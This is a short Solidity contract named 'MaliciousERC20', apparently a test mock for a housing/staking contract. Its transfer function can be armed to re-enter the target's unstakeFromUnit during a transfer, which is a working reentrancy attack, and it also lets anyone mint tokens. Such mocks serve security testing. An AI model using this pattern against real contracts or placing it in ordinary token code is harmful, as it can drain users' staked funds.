// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IHousingManagerReentrant {
    function unstakeFromUnit(uint256 unitId, uint256 amount) external;
}

contract MaliciousERC20 {
    string public name = "Malicious Token";
    string public symbol = "MAL";
    uint8 public decimals = 18;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    IHousingManagerReentrant public housing;
    uint256 public targetUnitId;
    uint256 public reenterAmount;
    bool public attackEnabled;
    bool internal entered;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);

    function setAttackTarget(address housingAddress, uint256 unitId, uint256 amount, bool enabled) external {
        housing = IHousingManagerReentrant(housingAddress);
        targetUnitId = unitId;
        reenterAmount = amount;
        attackEnabled = enabled;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 currentAllowance = allowance[from][msg.sender];
        require(currentAllowance >= amount, "insufficient allowance");
        allowance[from][msg.sender] = currentAllowance - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "insufficient balance");
        balanceOf[from] -= amount;

        if (attackEnabled && from == address(housing) && !entered && address(housing) != address(0) && reenterAmount > 0) {
            entered = true;
            housing.unstakeFromUnit(targetUnitId, reenterAmount);
            entered = false;
        }

        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
}
